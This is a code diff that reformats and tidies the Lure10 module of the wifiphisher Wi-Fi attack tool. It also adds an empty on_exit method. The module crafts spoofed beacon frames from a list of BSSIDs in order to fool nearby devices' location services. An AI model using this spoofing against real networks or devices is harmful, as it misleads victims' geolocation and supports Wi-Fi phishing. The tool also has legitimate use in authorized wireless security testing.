@@ -11,8 +11,8 @@ from collections import defaultdict
 import wifiphisher.common.constants as constants
 import scapy.layers.dot11 as dot11
 
-
 logger = logging.getLogger(__name__)
+
 
 class Lure10(object):
     """
@@ -25,7 +25,7 @@ class Lure10(object):
 
         :param self: A Lure10 object
         :param data: Shared data from main engine
-        :type self: Deauthentication
+        :type self: Lure10
         :type data: dict
         :return: None
         :rtype: None
@@ -65,22 +65,27 @@ class Lure10(object):
 
             with open(area_file) as _file:
                 for line in _file:
-                    # remove any white space and store the bssid(fist word)
+                    # remove any white space and store the BSSD (first word)
                     line.strip()
                     bssid = line.split(" ", 1)[0]
 
                     # craft the required packet parts
                     frame_part_0 = dot11.RadioTap()
-                    frame_part_1 = dot11.Dot11(subtype=8, addr1=constants.WIFI_BROADCAST,
-                                               addr2=bssid, addr3=bssid)
+                    frame_part_1 = dot11.Dot11(
+                        subtype=8,
+                        addr1=constants.WIFI_BROADCAST,
+                        addr2=bssid,
+                        addr3=bssid)
                     frame_part_2 = dot11.Dot11Beacon(cap=0x2105)
                     frame_part_3 = dot11.Dot11Elt(ID="SSID", info="")
-                    frame_part_4 = dot11.Dot11Elt(ID="Rates", info=constants.AP_RATES)
+                    frame_part_4 = dot11.Dot11Elt(
+                        ID="Rates", info=constants.AP_RATES)
                     frame_part_5 = dot11.Dot11Elt(ID="DSset", info=chr(7))
 
                     # create a complete packet by combining the parts
-                    complete_frame = (frame_part_0 / frame_part_1 / frame_part_2 / frame_part_3 /
-                                      frame_part_4 / frame_part_5)
+                    complete_frame = (
+                        frame_part_0 / frame_part_1 / frame_part_2 /
+                        frame_part_3 / frame_part_4 / frame_part_5)
                     logger.debug("Add lure10-beacon frame with BSSID %s",
                                  bssid)
                     # add the frame to the list
@@ -103,8 +108,8 @@ class Lure10(object):
             clutters
         """
 
-        return (not self.first_run and self.data.args.lure10_exploit and
-                ["Lure10 - Spoofing location services"] or [])
+        return (not self.first_run and self.data.args.lure10_exploit
+                and ["Lure10 - Spoofing location services"] or [])
 
     def send_channels(self):
         """
@@ -118,3 +123,13 @@ class Lure10(object):
         """
 
         return [self.data.target_ap_channel]
+
+    def on_exit(self):
+        """
+        :param self: A Lure10 object
+        :type self: Lure10
+        Free all the resources regarding to this module
+        :return: None
+        :rtype: None
+        """
+        pass
